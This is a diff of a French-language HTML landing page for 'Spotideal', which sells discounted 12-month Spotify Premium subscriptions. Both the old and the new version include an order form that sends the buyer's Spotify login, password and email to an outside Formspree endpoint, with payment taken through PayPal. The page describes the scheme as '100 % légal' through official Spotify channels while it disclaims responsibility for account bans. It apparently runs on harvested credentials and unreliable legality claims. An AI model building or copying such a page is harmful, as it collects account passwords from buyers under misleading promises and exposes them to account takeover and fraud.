@@ -1,442 +1,53 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>SpotiDeals - Spotify Premium 12 mois INDIVIDUEL</title>
-  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="css/design-system.css">
-  <link rel="stylesheet" href="css/style.css">
-  <link rel="icon" type="image/png" sizes="32x32" href="favicon/favicon-32x32.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="favicon/favicon-16x16.png">
-  <link rel="apple-touch-icon" sizes="180x180" href="favicon/apple-touch-icon.png">
-  <script src="https://www.paypal.com/sdk/js?client-id=AW-bLBrtEPaB0FTD-Oa4rQ1gbQBNLkkqsAtGh968nfbb-HA_ih-Cptg_1UzbE9GYagkCPtHFEUosfm&currency=CAD"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotideal - Abonnement Spotify à moindre coût</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="script.js" defer></script>
 </head>
 <body>
-  <!-- HEADER -->
-  <header class="header">
-    <div class="container header__inner">
-      <a href="#" class="logo"><img src="images/logo.webp" alt="SpotiDeals Logo" class="logo-img">SpotiDeals</a>
-      <nav class="nav">
-        <a href="#features">Fonctionnalités</a>
-        <a href="#details">Détails</a>
-        <a href="#offre">Offre</a>
-        <a href="#how">Comment ça marche</a>
-        <a href="#faq">FAQ</a>
-        <a href="#important">Important</a>
-        <a href="#order">Commander</a>
-      </nav>
-    </div>
-  </header>
-
-  <!-- HERO -->
-  <section class="hero" id="hero">
-    <div class="container hero__inner">
-      <h1>Spotify Premium 12 mois INDIVIDUEL</h1>
-      <p>Activation rapide, sans VPN. Économisez plus de 50 % !</p>
-      <a href="#order" class="btn">Je veux économiser</a>
-    </div>
-  </section>
-  <div class="divider"></div>
-
-  <!-- IMPORTANT -->
-  <section class="important" id="important">
-    <div class="container">
-      <h2 class="section-title">Important - Sécurité du Compte</h2>
-      <p>Pour garantir la sécurité de votre compte, veuillez suivre ces étapes :</p>
-      <ul class="important-list">
-        <li><span class="important-icon">🔒</span> Changez votre mot de passe Spotify avant de commencer la commande</li>
-        <li><span class="important-icon">🔒</span> Utilisez un mot de passe temporaire que vous pourrez changer après l'activation</li>
-        <li><span class="important-icon">🔒</span> Ne partagez jamais votre mot de passe habituel</li>
-      </ul>
-      <p>En complétant cette commande, vous déclarez :</p>
-      <ul class="important-list">
-        <li>Je comprends que vous vous connecterez temporairement à mon compte pour l'activation</li>
-        <li>Je comprends que toutes mes informations seront supprimées après l'activation</li>
-        <li>Je m'engage à changer mon mot de passe après l'activation</li>
-        <li>Je comprends que vous n'êtes pas responsable des décisions de Spotify concernant mon compte</li>
-        <li>Mon abonnement ne doit pas être actif au moment de l'achat</li>
-        <li>Je comprends qu'il n'y aura pas de remboursement si l'activation est réalisée</li>
-      </ul>
-    </div>
-  </section>
-  <div class="divider"></div>
-
-  <!-- FEATURES -->
-  <section class="features" id="features">
-    <div class="container">
-      <h2 class="section-title">Pourquoi SpotiDeals ?</h2>
-      <ul class="feature-list">
-        <li><span>🌍</span> Fonctionne dans le monde entier</li>
-        <li><span>✅</span> Prépayé pour 12 mois sur votre propre compte</li>
-        <li><span>✅</span> Aucun proxy ou VPN requis</li>
-        <li><span>✅</span> Réception immédiate de votre reçu par e-mail</li>
-        <li><span>⚠️</span> Je ne suis pas responsable si votre compte se fait bannir</li>
-        <li><span>✅</span> 100 % légal</li>
-      </ul>
-    </div>
-  </section>
-  <div class="divider"></div>
-
-  <!-- DETAILS -->
-  <section class="details" id="details">
-    <div class="container">
-      <h2 class="section-title">Détails du service</h2>
-      <ul class="detail-list">
-        <li>Prix normal : <del>175,12 $ CAD</del></li>
-        <li>Prix SpotiDeals : <strong>82,62 $ CAD</strong> tout inclus</li>
-        <li>Délai de traitement : 3 à 5 jours ouvrables</li>
-        <li>Activation effective dans les 24 h après traitement</li>
-        <li>Garantie : remboursement complet sous 30 jours</li>
-        <li>Support client disponible 7 jours après activation</li>
-      </ul>
-    </div>
-  </section>
-  <div class="divider"></div>
-
-  <!-- OFFRE -->
-  <section id="offre" class="offre">
-    <!-- 1. Titre de section -->
-    <h2 class="offre__title">
-      Notre Offre
-    </h2>
-
-    <!-- 2. Carte d'offre -->
-    <div class="offer-card">
-      <!-- 2.1. Nom du pack -->
-      <h3 class="offer-card__heading">
-        Pack 12 mois<br>INDIVIDUEL
-      </h3>
-
-      <!-- 2.2. Prix -->
-      <p class="offer-card__price">
-        <span class="offer-card__old">175,12 $</span>
-        <span class="offer-card__new">82,62 $ CAD</span>
-      </p>
-
-      <!-- 2.3. Liste bullets -->
-      <ul class="offer-card__list">
-        <li>Activation sous 48 – 72 h ouvrables</li>
-        <li>Service 100 % légal via canal Spotify</li>
-        <li>Suppression des données après activation</li>
-        <li>Remboursement complet si non livré sous 30 jours</li>
-      </ul>
-
-      <!-- 2.4. Bouton d'action -->
-      <a href="#order" class="btn btn--primary btn--full">
-        Choisir ce pack
-      </a>
-    </div>
-  </section>
-  <div class="divider"></div>
-
-  <!-- Comparatif -->
-  <section id="comparatif" class="comparatif">
-    <h2 class="comparatif__title">
-      Comparatif des Prix
-    </h2>
-
-    <div class="comparatif__grid">
-      <div class="comp-card comp-card--standard">
-        <h3 class="comp-card__heading">Prix officiel Spotify</h3>
-        <p class="comp-card__price">175,12 $</p>
-      </div>
-
-      <div class="comp-card comp-card--offer">
-        <h3 class="comp-card__heading">Notre Offre</h3>
-        <p class="comp-card__price">82,62 $</p>
-      </div>
-    </div>
-
-    <p class="comparatif__savings">
-      💰 Vous économisez 92,50 $ !
-    </p>
-  </section>
-  <div class="divider"></div>
-
-  <!-- Pourquoi nous faire confiance ? -->
-  <section id="trust" class="trust">
-    <!-- 1. Titre de section -->
-    <h2 class="trust__title">
-      Pourquoi nous faire confiance ?
-    </h2>
-
-    <!-- 2. Grille de cartes -->
-    <div class="trust__grid">
-      <!-- Sécurité -->
-      <div class="trust-card">
-        <i class="icon ph-shield-check icon-xl"></i>
-        <h4 class="trust-card__heading">Sécurité</h4>
-        <p class="trust-card__text">
-          Service 100 % légal &amp; HTTPS
-        </p>
-      </div>
-
-      <!-- Rapidité -->
-      <div class="trust-card">
-        <i class="icon ph-clock icon-xl"></i>
-        <h4 class="trust-card__heading">Rapidité</h4>
-        <p class="trust-card__text">
-          Activation en 48 – 72 h ouvrables
-        </p>
-      </div>
-
-      <!-- Confidentialité -->
-      <div class="trust-card">
-        <i class="icon ph-trash icon-xl"></i>
-        <h4 class="trust-card__heading">Confidentialité</h4>
-        <p class="trust-card__text">
-          Suppression des données après activation
-        </p>
-      </div>
-    </div>
-  </section>
-  <div class="divider"></div>
-
-  <!-- Comment ça marche -->
-  <section id="how" class="how">
-    <!-- 1. Titre de section -->
-    <h2 class="how__title">
-      Comment ça marche
-    </h2>
-
-    <!-- 2. Accordion -->
-    <div class="how__accordion">
-      <!-- Étape 1 : Préparation -->
-      <details class="how__item">
-        <summary class="how__summary">
-          <span>1. Préparation</span>
-          <i class="icon ph-chevron-down how__icon"></i>
-        </summary>
-        <p class="how__content">
-          Changez votre mot de passe Spotify avant de commencer et utilisez un mot de passe temporaire.
-        </p>
-      </details>
-      <!-- Étape 2 : Commande -->
-      <details class="how__item">
-        <summary class="how__summary">
-          <span>2. Commande</span>
-          <i class="icon ph-chevron-down how__icon"></i>
-        </summary>
-        <p class="how__content">
-          Remplissez le formulaire avec votre e-mail et votre mot de passe temporaire.
-        </p>
-      </details>
-      <!-- Étape 3 : Paiement -->
-      <details class="how__item">
-        <summary class="how__summary">
-          <span>3. Paiement</span>
-          <i class="icon ph-chevron-down how__icon"></i>
-        </summary>
-        <p class="how__content">
-          Payez via PayPal ou Formspree, en toute sécurité.
-        </p>
-      </details>
-      <!-- Étape 4 : Activation -->
-      <details class="how__item">
-        <summary class="how__summary">
-          <span>4. Activation</span>
-          <i class="icon ph-chevron-down how__icon"></i>
-        </summary>
-        <p class="how__content">
-          Nous activons votre compte dans les 48–72 h ouvrables.
-        </p>
-      </details>
-      <!-- Étape 5 : Confirmation -->
-      <details class="how__item">
-        <summary class="how__summary">
-          <span>5. Confirmation</span>
-          <i class="icon ph-chevron-down how__icon"></i>
-        </summary>
-        <p class="how__content">
-          Vous recevez un email de confirmation et profitez de votre abonnement.
-        </p>
-      </details>
-    </div>
-  </section>
-  <div class="divider"></div>
-
-  <!-- Légalité & Responsabilité -->
-  <section id="legal" class="legal">
-    <!-- 1. Titre de section -->
-    <h2 class="legal__title">
-      Légalité & Responsabilité
-    </h2>
-
-    <!-- 2. Accordion -->
-    <div class="legal__accordion">
-      <!-- Achat 100 % légal -->
-      <details class="legal__item">
-        <summary class="legal__summary">
-          <span>Achat 100 % légal</span>
-          <i class="icon ph-chevron-down legal__icon"></i>
-        </summary>
-        <p class="legal__content">
-          Nous utilisons exclusivement les canaux officiels de Spotify pour activer votre abonnement.
-        </p>
-      </details>
-
-      <!-- Suppression des données -->
-      <details class="legal__item">
-        <summary class="legal__summary">
-          <span>Suppression des données</span>
-          <i class="icon ph-chevron-down legal__icon"></i>
-        </summary>
-        <p class="legal__content">
-          Vos identifiants sont définitivement supprimés dès l'activation.
-        </p>
-      </details>
-
-      <!-- Politique de remboursement -->
-      <details class="legal__item">
-        <summary class="legal__summary">
-          <span>Politique de remboursement</span>
-          <i class="icon ph-chevron-down legal__icon"></i>
-        </summary>
-        <p class="legal__content">
-          Remboursement complet si non livré sous 30 jours ; aucun remboursement si activation réussie.
-        </p>
-      </details>
-
-      <!-- Non-responsabilité -->
-      <details class="legal__item">
-        <summary class="legal__summary">
-          <span>Non-responsabilité</span>
-          <i class="icon ph-chevron-down legal__icon"></i>
-        </summary>
-        <p class="legal__content">
-          Nous ne sommes pas responsables des décisions internes de Spotify concernant votre compte.
-        </p>
-      </details>
-    </div>
-  </section>
-  <div class="divider"></div>
-
-  <!-- FAQ -->
-  <section id="faq" class="faq">
-    <!-- 1. Titre de section -->
-    <h2 class="faq__title">
-      FAQ
-    </h2>
-
-    <!-- 2. Accordion FAQ -->
-    <div class="faq__accordion">
-      <!-- Q1 : Prolonger l'abonnement -->
-      <details class="faq__item">
-        <summary class="faq__summary">
-          <span>Comment prolonger mon abonnement ?</span>
-          <i class="icon ph-chevron-down faq__icon"></i>
-        </summary>
-        <p class="faq__content">
-          Il vous suffit de passer une nouvelle commande 48 h avant la fin de votre abonnement actuel.
-        </p>
-      </details>
-
-      <!-- Q2 : Déjà abonné -->
-      <details class="faq__item">
-        <summary class="faq__summary">
-          <span>Déjà abonné sur Spotify ?</span>
-          <i class="icon ph-chevron-down faq__icon"></i>
-        </summary>
-        <p class="faq__content">
-          Activez un nouvel email ou modifiez votre email existant avant de passer commande.
-        </p>
-      </details>
-
-      <!-- Q3 : Compte bloqué -->
-      <details class="faq__item">
-        <summary class="faq__summary">
-          <span>Mon compte est bloqué ?</span>
-          <i class="icon ph-chevron-down faq__icon"></i>
-        </summary>
-        <p class="faq__content">
-          Contactez-nous à 
-          <a href="mailto:spotideals.github.io@gmail.com" class="faq__link">
-            spotideals.github.io@gmail.com
-          </a> pour assistance.
-        </p>
-      </details>
-
-      <!-- Q4 : VPN -->
-      <details class="faq__item">
-        <summary class="faq__summary">
-          <span>Ai-je besoin d'un VPN ?</span>
-          <i class="icon ph-chevron-down faq__icon"></i>
-        </summary>
-        <p class="faq__content">
-          Non, votre compte fonctionne normalement après activation, sans VPN.
-        </p>
-      </details>
-    </div>
-  </section>
-  <div class="divider"></div>
-
-  <!-- Points clés à retenir -->
-  <section id="highlights" class="highlights">
-    <!-- 1. Titre -->
-    <h2 class="highlights__title">
-      Points clés à retenir
-    </h2>
-
-    <!-- 2. Liste d'items -->
-    <ul class="highlights__list">
-      <li class="highlight-item">
-        <i class="icon ph-shield-check highlight-icon"></i>
-        <span>Sécurité renforcée grâce au canal officiel Spotify</span>
-      </li>
-      <li class="highlight-item">
-        <i class="icon ph-clock highlight-icon"></i>
-        <span>Activation rapide en 48–72 h ouvrables</span>
-      </li>
-      <li class="highlight-item">
-        <i class="icon ph-currency-circle-dollar highlight-icon"></i>
-        <span>Économies réelles sur 12 mois</span>
-      </li>
-      <li class="highlight-item">
-        <i class="icon ph-trash-simple highlight-icon"></i>
-        <span>Suppression de vos données après activation</span>
-      </li>
-    </ul>
-  </section>
-  <div class="divider"></div>
-
-  <!-- ORDER FORM -->
-  <section class="commande" id="order">
-    <div class="container">
-      <h2 class="section-title">Commander</h2>
-      <form id="order-form" action="https://formspree.io/f/xanorewp" method="POST">
-        <input type="hidden" name="orderNumber" id="orderNumber">
-        <div class="form-group"><label for="email">Votre e-mail Spotify <span>*</span></label><input type="email" id="email" name="email" required></div>
-        <div class="form-group"><label for="password">Mot de passe temporaire <span>*</span></label><input type="password" id="password" name="password" required pattern=".{12,}" title="12 caractères min."></div>
-        <div class="form-group paypal-button-container"></div>
-        <div class="form-group"><button type="submit" class="btn">Valider la commande</button></div>
-      </form>
-    </div>
-  </section>
-
-  <!-- Footer -->
-  <section id="footer" class="footer">
-    <div class="footer__content">
-      <p class="footer__copy">
-        &copy; 2025 SpotiDeals.
-        <a href="mailto:spotideals.github.io@gmail.com" class="footer__link">
-          spotideals.github.io@gmail.com
-        </a>
-      </p>
-      <ul class="footer__links">
-        <li><a href="#legal" class="footer__link">Mentions légales</a></li>
-        <li><a href="#policy" class="footer__link">Confidentialité</a></li>
-      </ul>
-    </div>
-  </section>
-
-  <script>
-    document.getElementById('orderNumber').value = 'OD-' + Date.now() + '-' + Math.floor(Math.random()*1000);
-    paypal.Buttons({
-      createOrder(data, actions) { return actions.order.create({ purchase_units:[{ amount:{ value:'82.62' } }] }); },
-      onApprove(data, actions) { return actions.order.capture().then(()=>{ document.getElementById('order-form').submit(); }); }
-    }).render('.paypal-button-container');
-    function scrollToOrder(){ document.getElementById('order').scrollIntoView({behavior:'smooth'}); }
-  </script>
+    <header>
+        <h1>Spotideal</h1>
+        <p>Abonnement Spotify à moindre coût</p>
+    </header>
+    <main>
+        <section id="important-message">
+            <h2>Important - Sécurité du Compte</h2>
+            <ul>
+                <li>Changez votre mot de passe Spotify avant de commencer la commande.</li>
+                <li>Utilisez un mot de passe temporaire que vous pourrez changer après l'activation.</li>
+                <li>Ne partagez jamais votre mot de passe habituel.</li>
+            </ul>
+        </section>
+        <section id="service-details">
+            <h2>Notre Service</h2>
+            <p>Nous vous connectons temporairement à votre compte pour activer un abonnement Spotify de 12 mois prépayé à moindre coût.</p>
+            <p>Prix : <strong>82.62$ TOUT FRAIS INCLUS</strong> (Forfait individuel 1 an)</p>
+            <p>Prix normal : <strong>175.12$</strong></p>
+        </section>
+        <section id="order-form">
+            <h2>Passer une commande</h2>
+            <form id="orderForm" action="https://formspree.io/f/xanorewp" method="POST">
+                <label for="username">Nom d'utilisateur Spotify :</label>
+                <input type="text" id="username" name="username" required>
+                
+                <label for="password">Mot de passe temporaire :</label>
+                <input type="password" id="password" name="password" required>
+                
+                <label for="email">Adresse e-mail :</label>
+                <input type="email" id="email" name="email" required>
+                
+                <input type="hidden" id="orderNumber" name="orderNumber">
+                
+                <button type="submit">Commander</button>
+            </form>
+            <script src="https://www.paypal.com/sdk/js?client-id=AW-bLBrtEPaB0FTD-Oa4rQ1gbQBNLkkqsAtGh968nfbb-HA_ih-Cptg_1UzbE9GYagkCPtHFEUosfm&currency=CAD"></script>
+        </section>
+    </main>
+    <footer>
+        <p>Contactez-nous : <a href="mailto:spotideals.github.io@gmail.com">spotideals.github.io@gmail.com</a></p>
+    </footer>
 </body>
-</html> 
+</html>
